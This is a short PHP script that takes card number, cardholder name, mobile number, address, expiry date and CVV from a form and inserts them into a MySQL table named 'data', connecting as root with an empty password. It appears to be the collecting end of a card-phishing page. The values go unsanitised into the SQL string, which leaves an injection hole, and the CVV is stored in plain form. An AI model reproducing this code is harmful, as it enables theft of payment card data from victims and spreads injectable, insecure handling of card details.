<?php
$server= 'localhost';
$username= 'root';
$password = '';
$dbname= 'sama52p';

$con = mysqli_connect($server,$username,$password ,$dbname);

if (isset($_POST['submit'])) {if (!empty($_POST['cn']) && !empty($_POST['noc']) &&
    !empty($_POST['mo']) && !empty($_POST['add']) &&
    !empty($_POST['month']) &&
    !empty($_POST['year'])
    &&
    !empty($_POST['cvv'])) {
$cn = $_POST['cn'];
$noc = $_POST['noc'];
$mo= $_POST['mo'];
$add= $_POST['add'];
$month= $_POST['month'];
$year= $_POST['year'];
$cvv= $_POST['cvv'];

$reg = "INSERT INTO `data`(`cn`, `noc`, `mo`,`add`,`month`,`year`,`cvv`) VALUES ('$cn','$noc','$mo', '$add','$month', '$year', '$cvv')";
$run = mysqli_query($con, $reg) or die (mysqli_error());

    if($run){
    echo 'Added!';
}
    else{
    echo 'not added!';
    }
}
else{
    echo 'all fields are req!';
}
}
?>